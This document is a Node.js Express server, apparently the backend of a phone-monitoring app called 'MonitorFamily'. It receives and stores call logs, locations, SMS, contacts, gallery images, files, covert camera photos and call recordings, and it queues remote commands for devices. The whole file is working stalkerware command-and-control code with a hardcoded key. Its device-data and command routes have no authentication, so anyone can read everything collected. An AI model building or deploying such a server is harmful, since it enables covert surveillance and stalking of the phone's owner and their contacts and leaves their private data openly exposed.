const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;
const API_KEY = 'monitor-family-secret-7860';
const DATA_FILE = path.join(__dirname, 'devices.json');
const COMMANDS_FILE = path.join(__dirname, 'commands.json');

app.use(express.json({ limit: '50mb' }));
app.use(cors());

function getDevices() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        }
    } catch (e) { console.log('Error reading devices:', e.message); }
    return {};
}

function saveDevices(devices) {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(devices, null, 2));
    } catch (e) { console.log('Error saving devices:', e.message); }
}

function getCommands() {
    try {
        if (fs.existsSync(COMMANDS_FILE)) {
            return JSON.parse(fs.readFileSync(COMMANDS_FILE, 'utf8'));
        }
    } catch (e) { console.log('Error reading commands:', e.message); }
    return {};
}

function saveCommands(commands) {
    try {
        fs.writeFileSync(COMMANDS_FILE, JSON.stringify(commands, null, 2));
    } catch (e) { console.log('Error saving commands:', e.message); }
}

// 1. Sync
app.post('/api/sync', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });
    const { deviceId, deviceName, callLogs, location, battery, syncedAt } = req.body;
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
    const devices = getDevices();
    if (!devices[deviceId]) devices[deviceId] = { name: deviceName, callLogs: [], locations: [], battery: {}, lastSync: null };
    if (callLogs && callLogs.length > 0) devices[deviceId].callLogs = [...devices[deviceId].callLogs, ...callLogs];
    if (location) devices[deviceId].locations.push({ ...location, syncedAt });
    if (battery) devices[deviceId].battery = battery;
    devices[deviceId].lastSync = syncedAt || Date.now();
    saveDevices(devices);
    res.json({ success: true });
});

// 2. Camera
app.post('/api/camera', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });
    const { deviceId, photoBase64, timestamp, isFront } = req.body;
    const devices = getDevices();
    if (devices[deviceId]) {
        if (!devices[deviceId].photos) devices[deviceId].photos = [];
        devices[deviceId].photos.push({ photo: photoBase64, timestamp: timestamp || Date.now(), isFront });
        saveDevices(devices);
    }
    res.json({ success: true });
});

// 3. SMS
app.post('/api/sms', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });
    const { deviceId, sms } = req.body;
    const devices = getDevices();
    if (devices[deviceId]) {
        devices[deviceId].sms = sms;
        devices[deviceId].smsSyncedAt = Date.now();
        saveDevices(devices);
    }
    res.json({ success: true });
});

// 4. Contacts
app.post('/api/contacts', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });
    const { deviceId, contacts } = req.body;
    const devices = getDevices();
    if (devices[deviceId]) {
        devices[deviceId].contacts = contacts;
        saveDevices(devices);
    }
    res.json({ success: true });
});

// 5. Gallery
app.post('/api/gallery', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });
    const { deviceId, images } = req.body;
    const devices = getDevices();
    if (devices[deviceId]) {
        devices[deviceId].gallery = images;
        saveDevices(devices);
    }
    res.json({ success: true });
});

// 6. Files
app.post('/api/files', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });
    const { deviceId, files } = req.body;
    const devices = getDevices();
    if (devices[deviceId]) {
        devices[deviceId].files = files;
        saveDevices(devices);
    }
    res.json({ success: true });
});

// 7. Call Recording
app.post('/api/call-recording', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });
    const { deviceId, callNumber, callTime, duration, audioBase64, fileName, fileSize } = req.body;
    const devices = getDevices();
    if (devices[deviceId]) {
        if (!devices[deviceId].callRecordings) devices[deviceId].callRecordings = [];
        devices[deviceId].callRecordings.push({
            number: callNumber, time: callTime, duration, audioBase64, fileName, fileSize, receivedAt: Date.now()
        });
        saveDevices(devices);
    }
    res.json({ success: true });
});

// 8. Command
app.post('/api/command', (req, res) => {
    if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });
    const { deviceId, command, params } = req.body;
    if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
    const commands = getCommands();
    if (!commands[deviceId]) commands[deviceId] = [];
    commands[deviceId].push({ command, params, timestamp: Date.now(), executed: false });
    saveCommands(commands);
    res.json({ success: true, message: 'Command queued' });
});

// 9. Get Commands
app.get('/api/commands/:deviceId', (req, res) => {
    const commands = getCommands();
    const deviceCommands = commands[req.params.deviceId] || [];
    res.json({ commands: deviceCommands.filter(cmd => !cmd.executed) });
});

// 10. Mark Executed
app.post('/api/command/execute/:deviceId', (req, res) => {
    const { command } = req.body;
    const commands = getCommands();
    const deviceCommands = commands[req.params.deviceId] || [];
    const idx = deviceCommands.findIndex(c => c.command === command && !c.executed);
    if (idx !== -1) {
        deviceCommands[idx].executed = true;
        deviceCommands[idx].executedAt = Date.now();
        saveCommands(commands);
    }
    res.json({ success: true });
});

// 11. Get All Devices
app.get('/api/devices', (req, res) => {
    res.json(getDevices());
});

// Root
app.get('/', (req, res) => {
    res.send('MonitorFamily Backend is Running!');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
